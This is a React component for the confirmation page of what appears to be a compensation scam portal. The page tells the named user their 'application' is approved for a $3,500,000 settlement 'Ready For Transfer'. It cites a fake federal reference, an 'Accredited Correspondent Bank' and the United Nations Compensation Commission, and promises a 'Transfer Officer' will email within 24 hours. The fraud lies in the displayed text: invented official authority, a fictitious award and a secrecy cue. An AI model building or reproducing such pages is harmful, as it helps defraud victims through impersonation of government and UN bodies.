import React from 'react';
import { motion } from 'framer-motion';
import { CheckCircle2, Landmark, Mail, ArrowLeft, DollarSign, FileCheck, ShieldCheck, Printer } from 'lucide-react';
import GlassCard from '../components/GlassCard.tsx';
import MotionButton from '../components/MotionButton.tsx';
import { fadeInUp } from '../lib/animations.ts';

interface ConfirmationProps {
  fullName: string;
  onHome: () => void;
}

const Confirmation: React.FC<ConfirmationProps> = ({ fullName, onHome }) => {
  return (
    <div className="pt-32 pb-24 max-w-3xl mx-auto px-4">
      <motion.div
        variants={fadeInUp}
        initial="initial"
        animate="animate"
        className="text-center"
      >
        <div className="inline-block relative mb-12">
          <motion.div
            initial={{ scale: 0.8, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="w-32 h-32 bg-[#002868] text-white rounded-none flex items-center justify-center shadow-2xl relative z-10"
          >
            <ShieldCheck className="w-16 h-16" />
          </motion.div>
          <div className="absolute -inset-4 border-2 border-[#BF0A30] -z-10" />
          <div className="absolute top-0 right-0 -mr-16 mt-4">
            <div className="border-4 border-[#BF0A30] text-[#BF0A30] px-3 py-1 text-xs font-black uppercase rotate-12 bg-white">
              Authorized
            </div>
          </div>
        </div>

        <h2 className="text-5xl font-black text-slate-900 mb-4 tracking-tighter uppercase leading-none">Application Approved</h2>
        <p className="text-[#002868] font-black text-xs uppercase tracking-[0.2em] mb-12">
          Federal Reference: <span className="text-[#BF0A30]">BIS-CPM-025-2025</span>
        </p>

        <div className="bg-white border-2 border-slate-900 p-8 md:p-12 text-left mb-10 relative overflow-hidden">
          <div className="absolute top-0 right-0 w-24 h-24 bg-slate-50 border-l border-b border-slate-200 flex items-center justify-center">
            <Landmark className="w-10 h-10 text-slate-200" />
          </div>
          
          <h3 className="text-xl font-black uppercase tracking-tighter mb-6 border-b-2 border-slate-100 pb-4">
            Disbursement Re-Confirmation
          </h3>
          
          <div className="space-y-6 mb-10">
            <div className="flex justify-between items-end border-b border-slate-100 pb-2">
              <span className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Primary Beneficiary</span>
              <span className="text-lg font-black text-slate-900 uppercase tracking-tight">{fullName}</span>
            </div>
            <div className="flex justify-between items-end border-b border-slate-100 pb-2">
              <span className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Approved Amount</span>
              <span className="text-2xl font-black text-[#BF0A30] tracking-tighter">$3,500,000.00</span>
            </div>
            <div className="flex justify-between items-end border-b border-slate-100 pb-2">
              <span className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Status</span>
              <span className="text-xs font-black text-[#002868] uppercase tracking-widest bg-blue-50 px-2 py-0.5">Ready For Transfer</span>
            </div>
          </div>

          <div className="bg-slate-50 p-6 border-l-4 border-[#002868]">
            <h4 className="text-[10px] font-black text-slate-900 uppercase tracking-widest mb-3 flex items-center gap-2">
              <Mail className="w-4 h-4 text-[#BF0A30]" /> Next Protocol Steps
            </h4>
            <p className="text-xs font-bold text-slate-600 leading-relaxed uppercase tracking-tighter">
              Your claim data is now being synchronized with our Accredited Correspondent Bank. 
              An official Transfer Officer will contact you via your provided email within 24 hours 
              to finalize the crediting of your $3.5M settlement. 
              <strong> Keep this session reference private.</strong>
            </p>
          </div>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-12">
          <MotionButton onClick={onHome} variant="outline" className="rounded-none border-2 border-slate-900 font-black uppercase tracking-widest text-xs py-4">
            <ArrowLeft className="w-4 h-4" /> Exit Portal
          </MotionButton>
          <button className="bg-[#002868] text-white font-black uppercase tracking-widest text-xs py-4 flex items-center justify-center gap-2 hover:bg-slate-900 transition-all shadow-lg active:scale-95">
            <Printer className="w-4 h-4" /> Save Copy (PDF)
          </button>
        </div>

        <p className="text-[9px] text-slate-400 font-bold uppercase tracking-widest italic">
          Department of Settlement • BIS/CPM/025 • United Nations Compensation Commission
        </p>
      </motion.div>
    </div>
  );
};

export default Confirmation;